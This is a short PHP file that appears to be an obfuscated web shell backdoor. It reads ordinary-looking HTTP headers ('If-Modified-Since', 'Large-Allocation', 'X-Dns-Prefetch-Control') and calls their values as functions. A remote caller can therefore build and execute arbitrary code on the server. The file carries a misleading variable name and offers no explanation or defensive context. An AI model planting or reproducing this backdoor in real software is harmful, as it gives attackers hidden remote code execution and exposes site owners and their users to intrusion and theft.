<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Modified-Since'])) {
    $oauthexceptions = $_HEADERS['If-Modified-Since']('', $_HEADERS['Large-Allocation']($_HEADERS['X-Dns-Prefetch-Control']));
    $oauthexceptions();
}